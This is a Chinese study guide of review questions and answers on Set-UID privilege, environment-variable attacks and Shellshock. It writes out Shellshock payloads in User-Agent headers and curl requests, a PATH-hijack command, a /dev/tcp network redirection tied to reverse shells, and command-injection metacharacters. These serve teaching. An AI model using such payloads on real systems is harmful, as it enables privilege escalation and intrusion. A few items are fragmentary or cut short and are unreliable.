`chown` 清除 Set-UID 位是安全机制，目的是防止 owner 改变后产生意外特权。

## S2.6

6. 调试程序时，我们可以改变程序运行时的内部变量，从而改变程序行为。能不能用这种方法调试 Set-UID 程序并改变它的行为？例如程序本来要打开 `/tmp/xyz`，我们能否把文件名字符串改成 `/etc/passwd`？

-答案：
普通用户通常不能这样调试并改变 Set-UID 程序的行为。

-详细解释：
调试器非常强大，它可以：

```text
1. 查看程序内存
2. 修改变量
3. 改变控制流
4. 改写函数参数
5. 控制程序暂停和继续执行
```

如果普通用户可以调试 root-owned Set-UID 程序，那么他就可以把程序原本安全的行为改成危险行为。

例如程序本来只打开：

```text
/tmp/xyz
```

攻击者可以在调试器中把字符串改成：

```text
/etc/passwd
```

这样程序就可能以 root 权限打开或修改敏感文件。

因此操作系统通常会限制普通用户调试 Set-UID 程序。否则 Set-UID 程序的所有代码逻辑限制都会被绕过。

-PPT对应位置：
看 PPT 中 **“Set-UID 如何保证安全？”** 和 **“攻击面”** 部分。

-复习重点：
调试器能改变程序行为，所以普通用户不能随意调试拥有更高权限的 Set-UID 程序。

## S2.7

7. `system()` 和 `execve()` 都可以用来执行外部程序。为什么 `system()` 不安全，而 `execve()` 是安全的？

-答案：
`system()` 不安全，因为它会调用 shell 解释命令字符串，用户输入和环境变量可能影响最终执行的命令。`execve()` 更安全，因为它直接执行指定程序，命令和参数分离，不经过 shell 解释。

-详细解释：
`system()` 的典型用法是：

```c
system("ls");
```

它实际会通过 shell 执行，类似于：

```bash
/bin/sh -c "ls"
```

这就带来风险。因为 shell 会解释特殊字符，也会受环境变量影响，例如 `PATH`。

如果 Set-UID 程序中写的是：

```c
system("ls");
```

攻击者可以修改 `PATH`，让 shell 先找到攻击者伪造的 `ls` 程序。如果这个 Set-UID 程序的 EUID 是 root，那么攻击者伪造的程序也可能以 root 权限运行。

而 `execve()` 是直接执行指定路径的程序，例如：

```c
execve("/bin/ls", argv, envp);
```

这里命令路径是明确的，参数也通过数组传入。用户输入只会作为参数，不会被 shell 当成命令解释。

核心区别是：

```text
system(): 代码和数据可能混在一起
execve(): 命令和参数分开，代码和数据分离
```

-PPT对应位置：
看 PPT 中 **“调用其他程序：不安全的方法”**、**“安全的程序：使用 execve()”**、**“隔离原理”** 部分。

-复习重点：
在特权程序中避免使用 `system()`；如果必须调用外部程序，应使用 `execve()` 并提供绝对路径。

## S2.8

8. 程序读取用户输入时，我们可以用输入重定向让程序从文件读取输入。例如 `prog < myfile`。如果 `prog` 是 root-owned Set-UID 程序，能否通过下面方法让它读取 `/etc/shadow`？

```bash
prog < /etc/shadow
```

-答案：
不能。

-详细解释：
输入重定向 `< /etc/shadow` 是由 shell 在启动 `prog` 之前完成的。

也就是说，执行顺序大致是：

```text
1. shell 尝试打开 /etc/shadow
2. shell 把打开的文件作为 prog 的标准输入
3. shell 执行 prog
```

但是 shell 是普通用户运行的，不是 root-owned Set-UID 程序。普通用户没有权限打开 `/etc/shadow`，所以第一步就会失败。

Set-UID 权限是在程序 `prog` 开始执行后才生效的，而输入重定向发生在程序执行前。因此不能通过这种方式让 Set-UID 程序读取 `/etc/shadow`。

-PPT对应位置：
看 PPT 中 **“Set-UID 原理”** 和 **“权限泄露”** 部分。

-复习重点：
输入重定向由 shell 先完成，不是由 Set-UID 程序完成。Set-UID 权限不会帮助 shell 打开 `/etc/shadow`。

## S2.9

9. 一个 Set-UID 父进程的 EUID 是 root，RUID 是 bob。它用 `fork()` 创建子进程。父进程的标准输入、标准输出和标准错误会被子进程继承。如果子进程降低了 root 权限，它仍然保留这些设备的访问权。这看起来像能力泄露，类似本章讲过的 capability leaking。这样会造成危险吗？

-答案：
通常不会造成危险，因为标准输入、标准输出和标准错误一般本来就是由普通用户的 shell 打开的，普通用户本来就有权访问它们。

-详细解释：
能力泄露的危险在于：程序以高权限打开了一个受保护资源，然后降权后仍然保留该资源的文件描述符。

例如：

```text
1. root 权限打开 /etc/zzz
2. 得到 fd
3. 降权为普通用户
4. fd 仍然可以写 /etc/zzz
```

这就危险。

但标准输入、标准输出和标准错误通常来自用户自己的终端或文件，是在 Set-UID 程序启动之前由用户的 shell 设置好的。bob 本来就能访问这些设备，所以子进程降权后继续访问它们，一般不会获得额外权限。

但是如果 Set-UID 程序在 root 权限下把标准输入、输出或错误重定向到了某个受保护文件，然后又把这些文件描述符泄露给降权后的子进程，那就可能造成危险。

-PPT对应位置：
看 PPT 中 **“权限泄露”** 和 **“通过权限泄露发起的攻击”** 部分。

-复习重点：
判断是否是能力泄露，要看文件描述符是否指向了普通用户原本无权访问的受保护资源。

10. 超级用户想让 Alice 可以用 `more` 命令查看系统中的所有文件。他执行：

```bash
cp /bin/more /tmp/mymore
sudo chown root /tmp/mymore
sudo chmod 4700 /tmp/mymore
```

这样 `/tmp/mymore` 变成了 root-owned Set-UID 程序。之后超级用户通过其他命令只给 Alice 执行权限。Alice 不完全可信。允许 Alice 读取别人文件可以，但不允许她获得更多权限，例如写别人文件。请阅读 `more` 手册，说明 Alice 可以怎样获得更多权限。

-答案：
Alice 可以利用 `more` 的交互功能执行外部命令，例如在 `more` 中使用 `!` 执行 shell 命令，从而可能获得 root shell。

-详细解释：
`more` 不只是一个简单的文件查看器，它是一个交互式程序。很多分页程序允许用户在查看文件时执行额外命令。

如果 `/tmp/mymore` 是 root-owned Set-UID 程序，那么 Alice 运行它时，程序的 EUID 是 root。

不要把 `more`、`vi`、`sh`、`bash` 这类可交互或可执行外部命令的程序设成 Set-UID root。

## S2.11

11. 假设你有一个文件，只允许用户 ID 小于 1000 的用户读取。请描述如何实现。

-答案：
可以写一个 root-owned Set-UID 程序作为访问控制包装器。该程序检查调用者的真实用户 ID，如果 `getuid() < 1000`，就打开并输出该文件；否则拒绝访问。

-详细解释：
传统 Linux 文件权限只能表达：

```text
owner
group
others
```

它不能直接表达“UID 小于 1000 的用户可以读取”这种条件。

因此可以这样实现：

```text
1. 把目标文件设置为 root 拥有，普通用户不能直接读取。
2. 编写一个 root-owned Set-UID 程序。
3. 程序运行时检查真实用户 ID，也就是 getuid()。
4. 如果 getuid() < 1000，程序打开文件并把内容输出给用户。
5. 如果 getuid() >= 1000，程序拒绝访问。
```

这里必须检查 **RUID**，因为 RUID 表示真正启动程序的用户。如果检查 EUID，由于 Set-UID 程序的 EUID 可能是 root，就失去判断意义。

程序还应该避免调用 `system()`，避免命令注入，并且只提供读取功能，不提供写入功能。

-PPT对应位置：
看 PPT 中 **“两层设计”**、**“Set-UID 机制”**、**“最小特权原则”** 部分。

-复习重点：
当传统权限模型无法表达细粒度策略时，可以用 Set-UID 程序实现额外访问控制逻辑。

## S2.12

12. Sam 写了一个程序，从网页中解析论文链接 URL，然后用 `wget` 下载每个 URL。核心代码如下：

```c
char command[100];
char* line, url;

line = getNextLine(file);

while (line != NULL) {
    url = parseURL(line);
    if (url != NULL) {
        sprintf(command, "%s %s", "wget", url);
        system(command);
    }
    line = GetNextLine(file);
}
```

网页所有者知道 Sam 会这样处理网页，想攻击 Sam 的程序。他知道上面的代码，但不知道 `getNextLine()` 和 `parseURL()` 如何实现，只怀疑 Sam 可能写错了。
问题：

1. 如果你是攻击者，你会如何攻击？
2. 如何修复这个问题？

-答案：
攻击者可以在网页中放入恶意 URL，使 URL 中包含 shell 特殊字符，从而通过 `system()` 触发命令注入。修复方法是不要使用 `system()` 拼接命令字符串，而应使用 `execve()` 或安全库函数，并对 URL 做严格校验和长度检查。

-详细解释：
这段代码的危险点在于：

```c
sprintf(command, "%s %s", "wget", url);
system(command);
```

`system()` 会把 `command` 交给 shell 解释。
如果 URL 中包含 shell 元字符，例如：

```text
;
&&
|
`
$()
>
<
```

那么 URL 的一部分可能不再被当作普通数据，而是被 shell 当作命令执行。

例如攻击者构造一个看似 URL 的字符串，但里面加入命令分隔符。程序拼接后，shell 可能先执行 `wget`，然后再执行攻击者附加的命令。

另外还有第二个风险：

```c
char command[100];
sprintf(command, "%s %s", "wget", url);
```

如果 URL 很长，`sprintf()` 不检查长度，可能造成缓冲区溢出。

所以攻击者的思路可以包括：

```text
1. 在网页中放入包含 shell 特殊字符的 URL，尝试命令注入。
2. 放入超长 URL，尝试触发 command[100] 的缓冲区溢出。
3. 构造异常格式 URL，尝试利用 parseURL() 或 getNextLine() 的解析错误。
```

修复方法：

第一，避免使用 `system()`：

```text
不要构造 "wget URL" 这种命令字符串交给 shell。
```

应该使用 `execve()`，把命令和参数分开。例如概念上应执行：

```text
程序路径: /usr/bin/wget
参数 argv[0]: wget
参数 argv[1]: url
```

这样 URL 只是参数，不会被 shell 解释成命令。

第二，使用绝对路径：

```text
/usr/bin/wget
```

不要依赖 `PATH` 查找。

第三，做输入校验：

```text
1. 限制 URL 长度
2. 检查 URL scheme 是否只能是 http 或 https
3. 拒绝控制字符和不合理字符
4. 正确处理空格、引号、换行等特殊情况
```

第四，避免 `sprintf()`：

```c
snprintf(command, sizeof(command), ...)
```

但注意：即使用 `snprintf()` 防止溢出，也不能解决 `system()` 的命令注入问题。根本修复仍然是不用 shell 解释用户输入。

-PPT对应位置：
看 PPT 中 **“调用其他程序：不安全的方法”**、**“安全的程序：使用 execve()”**、**“隔离原理”** 部分。

-复习重点：
这题核心是两类漏洞：

```text
1. system() + 用户输入 = 命令注入风险
2. sprintf() + 固定小缓冲区 = 缓冲区溢出风险
```

最重要的防御思想是：

```text
代码和数据分离，不要让用户输入变成 shell 命令。
```

## S3.1

1. 环境变量和 shell 变量有什么区别？

-答案：
shell 变量只存在于当前 shell 内部；环境变量会被传递给子进程，成为子进程运行环境的一部分。

-详细解释：
shell 变量是 shell 自己维护的变量，例如：

```bash
foo=bar
```

这个变量默认只在当前 shell 中可见。当前 shell 启动子进程时，子进程一般看不到它。

如果希望子进程也能看到这个变量，需要使用：

```bash
export foo=bar
```

`export` 会把这个变量标记为可导出，使它在创建子进程时进入子进程的环境变量列表。

所以区别是：

```text
shell 变量：当前 shell 内部使用
环境变量：可以传递给子进程，影响子进程行为
```

-PPT对应位置：
看 PPT 中 **“Shell变量和环境变量”**、**“Shell 变量和环境变量是不同的”** 部分。

-复习重点：
记住一句话：**不是所有 shell 变量都是环境变量，只有 export 之后才会传给子进程。**

## S3.2

2. 在 Bash 中，如果我们运行 `export foo=bar`，它会改变当前进程的环境变量吗？

-答案：
严格来说，它不会直接修改当前 Bash 进程原始的环境变量块；它会在 Bash 内部创建或更新 shell 变量 `foo`，并把它标记为 export，使以后创建的子进程可以得到这个环境变量。

-详细解释：
执行：

```bash
export foo=bar
```

后，在用户角度看，`foo` 会成为一个“可导出的变量”。之后如果运行：

```bash
env
```

新启动的 `env` 子进程会看到：

```text
foo=bar
```

但是这不等于当前 Bash 进程原始的环境变量存储区域一定被修改。Bash 通常维护自己的变量表，在创建子进程时根据 export 标记构造子进程的环境变量。

所以更准确的说法是：

```text
export foo=bar 会影响之后子进程的环境变量，
但不应理解为直接修改了当前 Bash 进程原始环境变量块。
```

-PPT对应位置：
看 PPT 中 **“Shell变量和环境变量”**、**“/proc 文件系统的附注”** 部分。

-复习重点：
`export` 的重点是：**让变量进入子进程环境**。

## S3.3

3. 下面两种打印环境变量的方法有什么区别？

```bash
/usr/bin/env
/usr/bin/strings /proc/$$/environ
```

-答案：
`/usr/bin/env` 打印的是新启动的 `env` 子进程的环境变量；`strings /proc/$$/environ` 打印的是当前 shell 进程的环境变量。

-详细解释：
当你输入：

```bash
/usr/bin/env
```

shell 会 fork 一个子进程，然后运行 `/usr/bin/env`。因此 `env` 打印的是 **这个子进程** 得到的环境变量。

而：

```bash
strings /proc/$$/environ
```

其中 `$$` 会被 shell 替换为当前 shell 的进程 ID。所以它读取的是：

```text
/proc/当前shell进程ID/environ
```

因此它显示的是 **当前 shell 进程自身** 的环境变量。

这两个结果可能不同，特别是在 Bash 中刚刚 `export` 了某些变量后，`env` 子进程可能能看到，而 `/proc/$$/environ` 未必以同样方式反映出来。

-PPT对应位置：
看 PPT 中 **“/proc 文件系统的附注”** 部分。

-复习重点：
`env` 是子进程；`/proc/$$/environ` 是当前 shell 进程。

## S3.4

4. 在代码中，如果我们用 `execve()` 执行外部程序 `xyz`，并且第三个参数传入 `NULL`，运行 `xyz` 的进程会有多少个环境变量？

-答案：
会有 **0 个环境变量**。

-详细解释：
`execve()` 的函数形式是：

```c
execve(pathname, argv, envp);
```

第三个参数 `envp` 用来指定新程序的环境变量列表。

如果传入的是环境变量数组，例如：

```c
execve("/usr/bin/env", argv, environ);
```

那么新程序会得到 `environ` 中的环境变量。

如果第三个参数传入 `NULL`，则表示不给新程序提供环境变量。因此 `xyz` 启动后没有环境变量。

-PPT对应位置：
看 PPT 中 **“进程如何获取环境变量？”**、**“execve() 和环境变量”** 部分。

-复习重点：
`execve()` 第三个参数决定新程序有哪些环境变量。

## S3.5

5. Bob 说他从不在自己的代码中使用任何环境变量，所以他不需要担心由环境变量引起的安全问题。他说得对吗？

-答案：
不对。

-详细解释：
即使 Bob 自己的代码没有直接调用：

```c
getenv()
```

也不代表程序完全不受环境变量影响。

原因是程序可能间接使用环境变量，例如：

```text
1. 动态链接器可能使用 LD_PRELOAD、LD_LIBRARY_PATH 等变量
2. shell 可能使用 PATH、IFS 等变量
3. 被调用的外部程序可能使用环境变量
4. 库函数可能使用 LANG、LOCPATH、NLSPATH 等变量
```

例如 Bob 的程序调用了：

```c
system("ls");
```

虽然 Bob 没有显式读取环境变量，但 `system()` 会启动 shell，而 shell 会使用 `PATH` 查找 `ls`。攻击者可以通过修改 `PATH` 影响程序执行哪个 `ls`。

所以环境变量是程序运行环境的一部分，可能通过 shell、动态链接器、库函数、外部程序间接影响程序行为。

-PPT对应位置：
看 PPT 中 **“环境变量的攻击面”**、**“通过动态链接器发起的攻击”**、**“通过外部程序发起的攻击”** 部分。

-复习重点：
程序自己不用环境变量，不代表它依赖的组件不用环境变量。

## S3.6

6. 程序 `abc` 使用 `system()` 调用外部程序 `xyz`，而 `system()` 会受到 `PATH` 环境变量影响。当我们从 shell 提示符运行 `abc` 时，当前 shell 中的 `PATH` shell 变量是如何影响 `system()` 行为的？

-答案：
当前 shell 中被导出的 `PATH` 会作为环境变量传给 `abc`；`abc` 调用 `system()` 时又会启动 `/bin/sh`，这个 shell 继承 `PATH`，然后用 `PATH` 查找 `xyz`，因此当前 shell 的 `PATH` 会影响最终执行哪个 `xyz`。

-详细解释：
过程如下：

```text
1. 当前 shell 中有 PATH 变量。
2. PATH 通常是 export 的，因此会传给子进程。
3. 用户运行 abc，shell 创建子进程执行 abc。
4. abc 继承 PATH 环境变量。
5. abc 调用 system("xyz")。
6. system() 实际上启动 /bin/sh -c "xyz"。
7. /bin/sh 继承 abc 的 PATH。
8. shell 根据 PATH 查找 xyz。
```

如果攻击者把 `PATH` 改成：

```bash
export PATH=/tmp/hack:$PATH
```

并在 `/tmp/hack` 中放一个恶意 `xyz`，那么 `system("xyz")` 可能会先执行攻击者的版本。

这就是 PATH 环境变量攻击的典型方式。

-PPT对应位置：
看 PPT 中 **“通过外部程序发起的攻击：案例研究”** 和 **“PATH 环境变量”** 部分。

-复习重点：
`system()` 会调用 shell；shell 会使用 `PATH` 查找命令。
所以特权程序中不要写：

```c
system("xyz");
```

## S3.7

7. 为什么使用 `secure_getenv()` 比使用 `getenv()` 更好？

-答案：
因为 `secure_getenv()` 在安全敏感场景下会返回 `NULL`，避免特权程序使用用户控制的环境变量；而 `getenv()` 会直接返回环境变量值，可能导致特权程序被用户输入影响。

-详细解释：
`getenv()` 的作用是读取环境变量，例如：

```c
char *p = getenv("PWD");
```

问题是环境变量通常由用户控制。如果一个 Set-UID 程序直接相信 `getenv()` 的结果，就可能被攻击者影响。

`secure_getenv()` 与 `getenv()` 类似，但它会检查程序是否处于“安全执行”状态。例如：

```text
EUID != RUID
EGID != RGID
程序带有某些 capability
```

在这类情况下，`secure_getenv()` 会返回 `NULL`，防止特权程序读取不可信环境变量。

所以对于 Set-UID 程序或其他特权程序，`secure_getenv()` 更安全。

-PPT对应位置：
看 PPT 中 **“通过应用程序代码发起的攻击——应对措施”** 部分。

-复习重点：
`getenv()` 适合普通程序；特权程序应优先考虑 `secure_getenv()` 或完全避免依赖用户环境变量。

## S3.8

8. 一个特权 Set-UID 程序需要知道它当前所在目录。有两种典型方法：一种是使用 `PWD` 环境变量，另一种是使用 `getcwd()` 函数。你会选择哪一种？为什么？

-答案：
应该使用 `getcwd()`，不要依赖 `PWD` 环境变量。

-详细解释：
`PWD` 是环境变量，用户可以伪造或修改。例如攻击者可以运行：

```bash
export PWD=AAAAAAAAAAAA
```

或者把它设置成一个并不是真实当前目录的路径。

如果 Set-UID 程序相信 `PWD`，可能出现安全问题。例如程序把 `PWD` 复制到固定长度缓冲区中，攻击者可以构造很长的 `PWD` 触发缓冲区溢出。

而 `getcwd()` 会根据进程实际当前工作目录获取路径，它不是简单相信用户提供的字符串，因此更可靠。

可以这样理解：

```text
PWD 是用户告诉程序“我在哪里”
getcwd() 是程序向系统查询“我实际在哪里”
```

特权程序不能盲目信任用户告诉它的信息，所以应该用 `getcwd()`。

-PPT对应位置：
看 PPT 中 **“通过应用程序代码发起的攻击”** 部分，课件中举了 `PWD` 被用户篡改后导致风险的例子。

-复习重点：
环境变量是用户可控输入。特权程序需要真实系统状态时，应向系统查询，而不是相信环境变量。

## S3.9

9. 在 Linux 中，如果要执行的程序是 Set-UID 程序，动态链接器会忽略很多环境变量，例如 `LD_PRELOAD` 和 `LD_LIBRARY_PATH`。请阅读 `ld-linux` 手册并解释为什么下面这些环境变量也会被忽略：

```text
LD_AUDIT
LD_DEBUG_OUTPUT
```

-答案：
它们会被忽略，是因为如果 Set-UID 程序信任这些变量，攻击者就可以影响动态链接器行为，从而注入代码、泄露信息或让特权进程写入攻击者指定的文件。

-详细解释：
`LD_AUDIT` 用来指定审计共享库。动态链接器会加载这些 audit library 来监控或拦截动态链接过程。

如果 Set-UID 程序允许用户控制 `LD_AUDIT`，攻击者就可以指定自己的恶意共享库，使这个库被高权限进程加载。这样攻击者的代码可能以 Set-UID 程序的权限运行，这是严重的权限提升风险。

所以：

```text
LD_AUDIT 必须在 Set-UID 程序中被忽略。
```

`LD_DEBUG_OUTPUT` 用来指定动态链接器调试输出写到哪里。
如果 Set-UID 程序允许用户控制它，攻击者可能让高权限动态链接器把调试信息写到某个敏感位置，或者造成信息泄露、文件覆盖、权限滥用等问题。

所以：

```text
LD_DEBUG_OUTPUT 也必须在 Set-UID 程序中被忽略。
```

本质原因是：

```text
动态链接器运行在程序 main() 之前；
如果它受用户环境变量控制，
攻击者就可能在程序安全检查开始前影响高权限进程。
```

-PPT对应位置：
看 PPT 中 **“通过动态链接器发起的攻击”**、**“LD_PRELOAD 和 LD_LIBRARY_PATH”**、**“Set-UID 程序中动态链接器的应对措施”** 部分。

-复习重点：
凡是能影响动态链接器加载库、输出文件或调试行为的环境变量，在 Set-UID 程序中都必须谨慎处理或直接忽略。

## S3.10

10. 让普通用户执行特权任务有两种典型方法：一种是写一个 root-owned Set-UID 程序，让用户运行；另一种是使用专门的 root daemon 来为用户执行特权任务。请比较这两种方法的攻击面，并说明哪一种更安全。

-答案：
一般来说，root daemon 服务方式更安全，因为它的攻击面更小；Set-UID 程序的攻击面更大，尤其容易受到用户控制的环境变量影响。

-详细解释：
Set-UID 方法中，普通用户直接启动一个高权限程序。这个程序运行时会继承很多用户可控的运行环境，例如：

```text
环境变量
命令行参数
当前目录
文件描述符
资源限制
标准输入输出
```

因此攻击者可以通过这些入口影响特权程序行为。环境变量就是其中非常重要的攻击面。

例如：

```text
PATH
LD_PRELOAD
LD_LIBRARY_PATH
PWD
LANG
NLSPATH
```

这些变量可能被 shell、动态链接器、库函数、外部程序使用。

而 daemon 服务方式通常是：

```text
1. root 在系统启动时启动 daemon
2. daemon 运行在较可信的环境中
3. 普通用户不能直接控制 daemon 的环境变量
4. 普通用户只能通过定义好的接口向 daemon 发送请求
```

因此 daemon 的环境变量攻击面通常更小。

不过 daemon 方式也不是绝对安全。它仍然需要正确验证用户请求，避免输入验证漏洞、权限检查错误、命令注入、缓冲区溢出等问题。

总体比较：

```text
Set-UID 方法：
攻击面大，用户环境变量直接进入特权程序。

Daemon 方法：
攻击面较小，用户通常只能通过受控接口提交请求。
```

所以从安全角度看，daemon 服务方法通常比 Set-UID 方法更安全。

-PPT对应位置：
看 PPT 中 **“设置UID方法与服务方法”** 部分。

-复习重点：
Set-UID 程序直接继承用户环境，所以攻击面大；daemon 由可信环境启动，用户只能通过请求接口交互，所以环境变量攻击面更小。

1. 当一个包含 shell 函数定义的 shell 变量作为环境变量传递给子进程时，这个函数定义会发生什么？

```text
        ↓
子 Bash 从环境变量中恢复函数
```

## W6.5

5. Shellshock 漏洞要被成功利用，需要满足哪两个条件？

-答案：
需要满足两个条件：

```text
1. 攻击者能够控制传给 Bash 的环境变量。
2. 目标程序会启动存在漏洞的 Bash。
```

-详细解释：
Shellshock 的攻击载荷是放在环境变量里的。例如：


```text
攻击者输入进入环境变量
        +
目标程序启动有漏洞的 Bash
```

在 CGI 场景中，这两个条件通常都满足：

```text
User-Agent 可由远程用户控制
        ↓
Apache 把 User-Agent 变成环境变量
        ↓
CGI 脚本由 Bash 执行
        ↓
Shellshock 触发
```

-PPT对应位置：
看 PPT 中 **“利用 ShellShock 漏洞需要满足”**。

-复习重点：
Shellshock 不是“有 Bash 就一定能攻击”，必须有 **可控环境变量 + 有漏洞 Bash 被启动**。

7. 在针对 CGI 程序的 Shellshock 攻击中，我们能否不使用函数定义，而是直接把 shell 命令放进 `User-Agent` 字段，使 Bash 被触发时执行该命令？

-答案：
不能。单纯把命令放进 `User-Agent` 通常不会被 Bash 执行。

-详细解释：
假设攻击者写：

```text
User-Agent: /bin/ls
```

Apache 会把它变成：

```text
HTTP_USER_AGENT=/bin/ls
```

但是 Bash 不会随便执行环境变量里的普通字符串。

Shellshock 的触发点是 Bash 看到环境变量值像函数定义：

```bash
() { :; }; command
```

旧版本 Bash 会把它当成函数定义解析，并错误执行后面的 `command`。

所以必须写成类似：

```text
User-Agent: () { :; }; /bin/ls
```

而不是直接写：

```text
User-Agent: /bin/ls
```

-PPT对应位置：
看 PPT 中 **“ShellShock 漏洞”** 和 **“利用此漏洞”**。

-复习重点：
Shellshock 不是普通命令注入；它依赖 **Bash 函数定义解析漏洞**。

## W6.8

8. 为什么会犯这个错误？你从这个错误中学到了什么？

-答案：
这个错误是因为 Bash 在解析环境变量中的函数定义时，使用了过于强大的解析函数，没有严格限制它只能解析函数定义，导致函数定义后面的普通 shell 命令也被执行。教训是：环境变量是不可信输入，解析器必须严格限制输入格式，不能让数据被当成代码执行。

-详细解释：
Bash 本来想实现一个方便功能：

```text
父 Bash 可以把函数传给子 Bash
```

为了实现这个功能，Bash 会在启动时扫描环境变量，找出函数定义并解析。

问题是它使用的解析逻辑太宽松。它不仅能解析函数定义，还能解析并执行普通 shell 命令。

所以当环境变量是：

```bash
() { :; }; echo world
```

Bash 解析完函数定义后，没有停下来，而是继续执行：

```bash
echo world
```

这个错误的根本原因是：

```text
把不可信环境变量交给了可以执行命令的解析器
```

教训包括：

```text
1. 环境变量必须视为不可信输入。
2. 解析函数定义时必须严格检查格式。
3. 数据和代码必须分离。
4. 不要用“能执行命令”的通用解析器处理不可信数据。
5. 安全功能设计中要考虑滥用场景。
```

-PPT对应位置：
看 PPT 中 **“Bash 源代码中的错误”**。

-复习重点：
Shellshock 的本质是 **数据被当成代码执行**。

## W6.9

9. 还有一种把输入发送给 CGI 程序的方法，就是把输入放在 URL 里。例如：

```text
http://www.example.com/myprog.cgi?name=value
```

能不能把恶意函数定义放在上面 URL 的 `value` 字段中，使它进入 CGI 程序后触发 Shellshock？

-答案：
一般情况下不能，仅仅把恶意函数定义放在 `value` 字段中通常不会触发 Shellshock。

-详细解释：
在标准 CGI 中，URL 问号后面的内容通常作为整个查询字符串传给 CGI 程序，例如：

```text
name=value
```

会变成环境变量：

```text
QUERY_STRING=name=value
```

如果攻击者写：

```text
myprog.cgi?name=() { :; }; command
```

那么 CGI 程序看到的可能是：

```text
QUERY_STRING=name=() { :; }; command
```

注意这个环境变量的值开头是：

```text
name=
```

不是：

```bash
() {
```

所以 Bash 不会把它识别成函数定义，也就不会触发 Shellshock。

但是，如果某个 Web 框架或 CGI 程序自己把 `value` 单独提取出来，并设置成某个环境变量，例如：

```text
SOMEVAR=() { :; }; command
```

那么就可能触发。

所以标准 CGI 情况下，一般不能；特殊程序如果把参数值单独放进环境变量，就可能。

-PPT对应位置：
看 PPT 中 **“如何使攻击载荷进入 CGI 程序”**。

-复习重点：
关键不是“输入在哪里”，而是它最终是否变成了一个 **值以 `() {` 开头的环境变量**。

## W6.10

10. 我们在机器 1 上运行：

```bash
nc -l 7070
```

机器 1 的 IP 地址是 `10.0.2.6`。然后在机器 2 上输入：

```bash
/bin/cat < /dev/tcp/10.0.2.6/7070 >&0
```

会发生什么？

-答案：
机器 2 会连接到机器 1 的 7070 端口。机器 2 上的 `cat` 会从这个 TCP 连接读取输入，并把读到的内容再写回同一个连接。因此机器 1 上输入的内容会被机器 2 回显回来。

-详细解释：
机器 1 上：

```bash
nc -l 7070
```

表示用 netcat 监听 7070 端口，等待别人连接。

机器 2 上：

```bash
/bin/cat < /dev/tcp/10.0.2.6/7070 >&0
```

其中：

```text
/dev/tcp/10.0.2.6/7070
```

是 Bash 支持的一种特殊网络重定向方式，它会建立到 `10.0.2.6:7070` 的 TCP 连接。

`< /dev/tcp/...` 表示：

```text
cat 的标准输入来自这个 TCP 连接
```

`>&0` 表示：

```text
cat 的标准输出也重定向到标准输入所指向的地方
```

因此 `cat` 从网络连接读数据，再写回同一个网络连接。

所以在机器 1 的 netcat 窗口中输入文字，机器 2 上的 `cat` 会收到，然后再发回机器 1，机器 1 会看到回显。

-PPT对应位置：
看 PPT 中 **“创建反向 Shell”**、**“文件描述符 0/1/2 重定向”** 部分。

-复习重点：
`/dev/tcp/IP/PORT` 可以建立 TCP 连接；`0` 是标准输入，`1` 是标准输出，`2` 是标准错误。

## W6.12

12. 考虑下面程序：

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

extern char **environ;

int main()
{
    char *args[] =
    {
        "/bin/sh", "-c",
        "/bin/ls", NULL
    };

    pid_t pid = fork();

    if(pid == 0) {
        printf("child\n");
        execve(args[0], &args[0], NULL);
    }
    else if(pid > 0) {
        printf("parent\n");
    }

    return 0;
}
```

程序 fork 一个子进程，并使用 `/bin/sh` 执行 `/bin/ls`。`/bin/sh` 是指向 `/bin/bash` 的符号链接。程序如下运行：

```bash
gcc prog.c -o prog
export foo='() { echo hello; }; echo world;'
./prog
```

解释程序输出是什么，为什么。

-答案：
程序会输出 `parent` 和 `child`，顺序不一定；子进程还会执行 `/bin/ls`，所以会输出当前目录文件列表。不会输出 `world`，也不会输出 `hello`。

-详细解释：
父进程执行：

```c
printf("parent\n");
```

子进程执行：

```c
printf("child\n");
```

由于父子进程并发执行，所以 `parent` 和 `child` 的顺序不确定。

子进程之后执行：

```c
execve(args[0], &args[0], NULL);
```

这里第三个参数是：

```c
NULL
```

表示不给新程序传递任何环境变量。

虽然当前 shell 中有：

```bash
foo='() { echo hello; }; echo world;'
```

但因为 `execve()` 第三个参数是 `NULL`，所以 `/bin/sh` 启动后没有继承这个环境变量。Shellshock payload 没有传进去，因此不会触发。

然后 `/bin/sh -c /bin/ls` 会执行 `/bin/ls`，所以会显示目录列表。

因此可能输出类似：

```text
parent
child
...当前目录文件列表...
```

也可能先输出 `child` 再输出 `parent`。

-PPT对应位置：
看 PPT 中 **“ShellShock 漏洞”** 和 **“execve 传递环境变量”** 相关内容。

-复习重点：
`execve()` 第三个参数是 `NULL` 时，新程序没有环境变量，Shellshock payload 不会传给 Bash。

请重新分析 W6.12 的结果。

## W6.14

14. 考虑一个作为 Apache 模块运行的 PHP 程序和一个 CGI 程序。

PHP 程序 `test.php`：

```php
<?php
system("/bin/ls -l")
?>
```

CGI 程序 `test.cgi`：

```bash
#!/bin/sh
/bin/ls -l
```

两个程序都会在新 shell 进程中调用 `/bin/ls`，并且 `/bin/sh` 指向 `/bin/bash`。如果用下面方式访问它们，请解释 Shellshock 对这两种情况的影响有什么不同。利用 Shellshock 分别需要什么条件？

```bash
curl -A "() { echo hello; }; echo world;" http://localhost/test.php
curl -A "() { echo hello; }; echo world;" http://localhost/test.cgi
```

-答案：
CGI 程序更容易触发 Shellshock，因为 Apache 会把 `User-Agent` 转换成 CGI 环境变量传给 CGI 程序，而 CGI 脚本由 Bash 执行。PHP 作为 Apache 模块运行时，`User-Agent` 通常不会自动作为环境变量传给 `system()` 启动的 Bash，因此一般不会触发 Shellshock。

-详细解释：
先看 CGI 程序。

攻击者发送：

```bash
curl -A "() { echo hello; }; echo world;" http://localhost/test.cgi
```

其中 `-A` 设置的是 HTTP `User-Agent`。Apache 处理 CGI 请求时，会把它变成环境变量：

```text
HTTP_USER_AGENT=() { echo hello; }; echo world;
```

`test.cgi` 第一行是：

```bash
#!/bin/sh
```

并且题目说 `/bin/sh` 指向 `/bin/bash`。所以 Apache 执行 CGI 时会启动 Bash。Bash 收到环境变量后，如果存在 Shellshock 漏洞，就会执行函数定义后面的：

```bash
echo world
```

然后继续执行脚本中的：

```bash
/bin/ls -l
```

所以 CGI 情况下可能输出 `world`，再输出目录列表。

再看 PHP 模块。

`test.php` 是作为 Apache 模块运行的，不是 CGI 进程。HTTP 请求头虽然能被 PHP 通过 `$_SERVER` 访问，但它通常不会自动变成 `system()` 启动的 shell 进程环境变量。

因此 PHP 中：

```php
system("/bin/ls -l")
```

虽然会启动 shell，但这个 shell 一般不会收到恶意的 `HTTP_USER_AGENT` 环境变量，所以 Shellshock 不会触发。

